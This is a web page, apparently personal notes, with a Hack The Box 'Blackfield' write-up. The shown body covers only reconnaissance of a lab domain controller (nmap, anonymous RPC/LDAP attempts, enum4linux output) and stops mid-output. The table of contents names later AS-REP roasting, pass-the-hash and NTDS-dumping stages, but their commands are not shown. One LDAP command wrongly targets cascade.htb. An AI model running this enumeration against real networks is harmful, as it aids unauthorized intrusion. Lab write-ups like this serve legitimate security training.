      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC9/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC9
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Impersonation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Impersonation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Vhosts/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Vhosts
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC16/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC16
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC15/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC15
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../shadowcredential/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    shadowcredential
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ADdisabledaccount/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ADdisabledaccount
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#intro" class="md-nav__link">
    <span class="md-ellipsis">
      Intro
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#add-target-to-etchosts" class="md-nav__link">
    <span class="md-ellipsis">
      Add target to /etc/hosts
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nmap-scan" class="md-nav__link">
    <span class="md-ellipsis">
      Nmap scan
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rpc-enumeration-as-anonymous" class="md-nav__link">
    <span class="md-ellipsis">
      RPC enumeration as anonymous
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldap-enumeration-as-anonymous" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP enumeration as anonymous
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enum4linux" class="md-nav__link">
    <span class="md-ellipsis">
      Enum4linux
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration-as-anonymous" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration as anonymous
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#as-rep-roasting" class="md-nav__link">
    <span class="md-ellipsis">
      AS-REP roasting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rpc-enumeration-as-user-support" class="md-nav__link">
    <span class="md-ellipsis">
      RPC enumeration as user support
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration-as-user-support" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration as user support
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldap-enumeration-as-user-support" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP enumeration as user support
    </span>
  </a>
  
    <nav class="md-nav" aria-label="LDAP enumeration as user support">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bloodhound-as-support" class="md-nav__link">
    <span class="md-ellipsis">
      Bloodhound as support
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#foothold" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Foothold">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#password-reset-as-user-support-towards-user-audit2020" class="md-nav__link">
    <span class="md-ellipsis">
      Password reset as user support towards user AUDIT2020
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration-with-creds-as-audit2020" class="md-nav__link">
    <span class="md-ellipsis">
      SMB Enumeration with creds as AUDIT2020
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SMB Enumeration with creds as AUDIT2020">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#file-inspection" class="md-nav__link">
    <span class="md-ellipsis">
      File inspection
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#logging-in-as-svc_backup-via-pass-the-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Logging in as SVC_BACKUP via pass the hash
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privesc" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Privesc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#abusing-backup-operators-privileges" class="md-nav__link">
    <span class="md-ellipsis">
      Abusing BACKUP OPERATORS privileges
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dumping-ntds-using-the-system-hive" class="md-nav__link">
    <span class="md-ellipsis">
      Dumping NTDS using the SYSTEM hive
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#logging-in-as-administrator-via-pass-the-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Logging in as Administrator via pass the hash
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      Summary
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Summary">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reconnaissance_1" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#foothold_1" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privesc_1" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sidenotes" class="md-nav__link">
    <span class="md-ellipsis">
      Sidenotes
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



<h2 id="intro">Intro</h2>
<p><img alt="" src="../MediaFiles/Pasted%20image%2020250809133212.png" /></p>
<p>[[windows]] [[NotAssumedBreach]] [[OSCPpath]] [[PrivGroupAbuse]]</p>
<p>Tags: #windows #NotAssumedBreach #OSCPpath #PrivGroupAbuse <br />
Tools used:<br />
- rpcclient (RPC enum)<br />
- smbmap (SMB enum)<br />
- smbclient (SMB enum)<br />
- nxc (enumeration)<br />
- GetNPUsers.py (AS-REP roasting)<br />
- bloodyAD (AD password reset)<br />
- pypykatz (dumping LSASS dump)<br />
- impacket-secretsdump (dumping NTDS)</p>
<hr />
<h1 id="reconnaissance">Reconnaissance</h1>
<h2 id="add-target-to-etchosts">Add target to /etc/hosts</h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>sh<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;echo &#39;10.129.164.18 blackfield.htb&#39; &gt;&gt; /etc/hosts&quot;</span>
</span></code></pre></div>
<h2 id="nmap-scan">Nmap scan</h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>blackfield.htb
</span></code></pre></div>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.94SVN<span class="w"> </span><span class="o">(</span><span class="w"> </span>&lt;https://nmap.org&gt;<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-08-04<span class="w"> </span><span class="m">17</span>:06<span class="w"> </span>CDT
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>blackfield.htb<span class="w"> </span><span class="o">(</span><span class="m">10</span>.129.164.18<span class="o">)</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.0076s<span class="w"> </span>latency<span class="o">)</span>.
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">993</span><span class="w"> </span>filtered<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>VERSION
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="m">53</span>/tcp<span class="w">   </span>open<span class="w">  </span>domain<span class="w">        </span>Simple<span class="w"> </span>DNS<span class="w"> </span>Plus
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="m">88</span>/tcp<span class="w">   </span>open<span class="w">  </span>kerberos-sec<span class="w">  </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Kerberos<span class="w"> </span><span class="o">(</span>server<span class="w"> </span>time:<span class="w"> </span><span class="m">2025</span>-08-05<span class="w"> </span><span class="m">05</span>:06:57Z<span class="o">)</span>
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="m">135</span>/tcp<span class="w">  </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="m">389</span>/tcp<span class="w">  </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>BLACKFIELD.local0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="m">445</span>/tcp<span class="w">  </span>open<span class="w">  </span>microsoft-ds?
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="m">593</span>/tcp<span class="w">  </span>open<span class="w">  </span>ncacn_http<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="m">3268</span>/tcp<span class="w"> </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>BLACKFIELD.local0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>Service<span class="w"> </span>Info:<span class="w"> </span>Host:<span class="w"> </span>DC01<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows
</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>
</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>Host<span class="w"> </span>script<span class="w"> </span>results:
</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="p">|</span><span class="w"> </span>smb2-time:
</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2025</span>-08-05T05:07:00
</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span>N/A
</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="p">|</span>_clock-skew:<span class="w"> </span>6h59m59s
</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="p">|</span><span class="w"> </span>smb2-security-mode:
</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="p">|</span><span class="w">   </span><span class="m">3</span>:1:1:
</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a><span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>and<span class="w"> </span>required
</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>
</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>&lt;https://nmap.org/submit/&gt;<span class="w"> </span>.
</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">51</span>.27<span class="w"> </span>seconds
</span></code></pre></div><br />
According to the open ports this appears to be a DC, lets move on towards the enumeration of services, nothing further interesting really stands out by just observing the above scan results.</p>
<h2 id="rpc-enumeration-as-anonymous">RPC enumeration as anonymous</h2>
<p><strong>Anonymous login:</strong><br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-N<span class="w"> </span>blackfield.htb
</span></code></pre></div><br />
was not successful</p>
<h2 id="ldap-enumeration-as-anonymous">LDAP enumeration as anonymous</h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>ldapsearch<span class="w"> </span>-LLL<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://blackfield.htb<span class="w"> </span>-s<span class="w"> </span>base<span class="w"> </span>namingcontexts<span class="w"> </span>
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>dn:
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>namingcontexts:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>BLACKFIELD,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>namingcontexts:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>BLACKFIELD,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>namingcontexts:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>BLACKFIELD,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>namingcontexts:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>BLACKFIELD,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>namingcontexts:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>BLACKFIELD,DC<span class="o">=</span><span class="nb">local</span>
</span></code></pre></div>
<p><strong>check if anonymous login is allowed</strong><br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>ldapsearch<span class="w"> </span>-LLL<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://cascade.htb<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=cascade,DC=local&quot;</span>
</span></code></pre></div><br />
i got nothing, so that means that<strong>anonymous bind is not enabled</strong></p>
<h2 id="enum4linux">Enum4linux</h2>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>ENUM4LINUX<span class="w"> </span>-<span class="w"> </span>next<span class="w"> </span>generation<span class="w"> </span><span class="o">(</span>v1.3.4<span class="o">)</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w"> </span><span class="o">==========================</span>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="p">|</span><span class="w">    </span>Target<span class="w"> </span>Information<span class="w">    </span><span class="p">|</span>
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="w"> </span><span class="o">==========================</span>
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Target<span class="w"> </span>...........<span class="w"> </span>blackfield.htb
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Username<span class="w"> </span>.........<span class="w"> </span><span class="s1">&#39;&#39;</span>
</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Random<span class="w"> </span>Username<span class="w"> </span>..<span class="w"> </span><span class="s1">&#39;glltacrg&#39;</span>
</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Password<span class="w"> </span>.........<span class="w"> </span><span class="s1">&#39;&#39;</span>
</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Timeout<span class="w"> </span>..........<span class="w"> </span><span class="m">5</span><span class="w"> </span>second<span class="o">(</span>s<span class="o">)</span>
</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>
</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="w"> </span><span class="o">=======================================</span>
</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a><span class="p">|</span><span class="w">    </span>Listener<span class="w"> </span>Scan<span class="w"> </span>on<span class="w"> </span>blackfield.htb<span class="w">    </span><span class="p">|</span>
</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="w"> </span><span class="o">=======================================</span>
</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>LDAP
</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>LDAP<span class="w"> </span>is<span class="w"> </span>accessible<span class="w"> </span>on<span class="w"> </span><span class="m">389</span>/tcp
</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>LDAPS
</span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Could<span class="w"> </span>not<span class="w"> </span>connect<span class="w"> </span>to<span class="w"> </span>LDAPS<span class="w"> </span>on<span class="w"> </span><span class="m">636</span>/tcp:<span class="w"> </span>timed<span class="w"> </span>out
</span><span id="__span-7-19"><a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>SMB
</span><span id="__span-7-20"><a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>SMB<span class="w"> </span>is<span class="w"> </span>accessible<span class="w"> </span>on<span class="w"> </span><span class="m">445</span>/tcp
</span><span id="__span-7-21"><a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>SMB<span class="w"> </span>over<span class="w"> </span>NetBIOS
</span><span id="__span-7-22"><a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Could<span class="w"> </span>not<span class="w"> </span>connect<span class="w"> </span>to<span class="w"> </span>SMB<span class="w"> </span>over<span class="w"> </span>NetBIOS<span class="w"> </span>on<span class="w"> </span><span class="m">139</span>/tcp:<span class="w"> </span>timed<span class="w"> </span><span class="nv">out</span>
</span><span id="__span-7-23"><a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a>
</span><span id="__span-7-24"><a id="__codelineno-7-24" name="__codelineno-7-24" href="#__codelineno-7-24"></a><span class="w"> </span><span class="o">======================================================</span>
</span><span id="__span-7-25"><a id="__codelineno-7-25" name="__codelineno-7-25" href="#__codelineno-7-25"></a><span class="p">|</span><span class="w">    </span>Domain<span class="w"> </span>Information<span class="w"> </span>via<span class="w"> </span>LDAP<span class="w"> </span><span class="k">for</span><span class="w"> </span>blackfield.htb<span class="w">    </span><span class="p">|</span>
</span><span id="__span-7-26"><a id="__codelineno-7-26" name="__codelineno-7-26" href="#__codelineno-7-26"></a><span class="w"> </span><span class="o">======================================================</span>
</span><span id="__span-7-27"><a id="__codelineno-7-27" name="__codelineno-7-27" href="#__codelineno-7-27"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>LDAP
</span><span id="__span-7-28"><a id="__codelineno-7-28" name="__codelineno-7-28" href="#__codelineno-7-28"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Appears<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>root/parent<span class="w"> </span>DC
</span><span id="__span-7-29"><a id="__codelineno-7-29" name="__codelineno-7-29" href="#__codelineno-7-29"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Long<span class="w"> </span>domain<span class="w"> </span>name<span class="w"> </span>is:<span class="w"> </span>BLACKFIELD.local
</span><span id="__span-7-30"><a id="__codelineno-7-30" name="__codelineno-7-30" href="#__codelineno-7-30"></a>
</span><span id="__span-7-31"><a id="__codelineno-7-31" name="__codelineno-7-31" href="#__codelineno-7-31"></a><span class="w"> </span><span class="o">=============================================================</span>
</span><span id="__span-7-32"><a id="__codelineno-7-32" name="__codelineno-7-32" href="#__codelineno-7-32"></a><span class="p">|</span><span class="w">    </span>NetBIOS<span class="w"> </span>Names<span class="w"> </span>and<span class="w"> </span>Workgroup/Domain<span class="w"> </span><span class="k">for</span><span class="w"> </span>blackfield.htb<span class="w">    </span><span class="p">|</span>
</span><span id="__span-7-33"><a id="__codelineno-7-33" name="__codelineno-7-33" href="#__codelineno-7-33"></a><span class="w"> </span><span class="o">=============================================================</span>
</span><span id="__span-7-34"><a id="__codelineno-7-34" name="__codelineno-7-34" href="#__codelineno-7-34"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Could<span class="w"> </span>not<span class="w"> </span>get<span class="w"> </span>NetBIOS<span class="w"> </span>names<span class="w"> </span>information<span class="w"> </span>via<span class="w"> </span><span class="s1">&#39;nmblookup&#39;</span>:<span class="w"> </span>timed<span class="w"> </span><span class="nv">out</span>
</span><span id="__span-7-35"><a id="__codelineno-7-35" name="__codelineno-7-35" href="#__codelineno-7-35"></a>
</span><span id="__span-7-36"><a id="__codelineno-7-36" name="__codelineno-7-36" href="#__codelineno-7-36"></a><span class="w"> </span><span class="o">===========================================</span>
</span><span id="__span-7-37"><a id="__codelineno-7-37" name="__codelineno-7-37" href="#__codelineno-7-37"></a><span class="p">|</span><span class="w">    </span>SMB<span class="w"> </span>Dialect<span class="w"> </span>Check<span class="w"> </span>on<span class="w"> </span>blackfield.htb<span class="w">    </span><span class="p">|</span>
</span><span id="__span-7-38"><a id="__codelineno-7-38" name="__codelineno-7-38" href="#__codelineno-7-38"></a><span class="w"> </span><span class="o">===========================================</span>
</span><span id="__span-7-39"><a id="__codelineno-7-39" name="__codelineno-7-39" href="#__codelineno-7-39"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>on<span class="w"> </span><span class="m">445</span>/tcp
</span><span id="__span-7-40"><a id="__codelineno-7-40" name="__codelineno-7-40" href="#__codelineno-7-40"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Supported<span class="w"> </span>dialects<span class="w"> </span>and<span class="w"> </span>settings:
</span><span id="__span-7-41"><a id="__codelineno-7-41" name="__codelineno-7-41" href="#__codelineno-7-41"></a>Supported<span class="w"> </span>dialects:
</span><span id="__span-7-42"><a id="__codelineno-7-42" name="__codelineno-7-42" href="#__codelineno-7-42"></a><span class="w">  </span>SMB<span class="w"> </span><span class="m">1</span>.0:<span class="w"> </span><span class="nb">false</span>
</span><span id="__span-7-43"><a id="__codelineno-7-43" name="__codelineno-7-43" href="#__codelineno-7-43"></a><span class="w">  </span>SMB<span class="w"> </span><span class="m">2</span>.02:<span class="w"> </span><span class="nb">true</span>
</span><span id="__span-7-44"><a id="__codelineno-7-44" name="__codelineno-7-44" href="#__codelineno-7-44"></a><span class="w">  </span>SMB<span class="w"> </span><span class="m">2</span>.1:<span class="w"> </span><span class="nb">true</span>
</span><span id="__span-7-45"><a id="__codelineno-7-45" name="__codelineno-7-45" href="#__codelineno-7-45"></a><span class="w">  </span>SMB<span class="w"> </span><span class="m">3</span>.0:<span class="w"> </span><span class="nb">true</span>
</span><span id="__span-7-46"><a id="__codelineno-7-46" name="__codelineno-7-46" href="#__codelineno-7-46"></a><span class="w">  </span>SMB<span class="w"> </span><span class="m">3</span>.1.1:<span class="w"> </span><span class="nb">true</span>
</span><span id="__span-7-47"><a id="__codelineno-7-47" name="__codelineno-7-47" href="#__codelineno-7-47"></a>Preferred<span class="w"> </span>dialect:<span class="w"> </span>SMB<span class="w"> </span><span class="m">3</span>.0
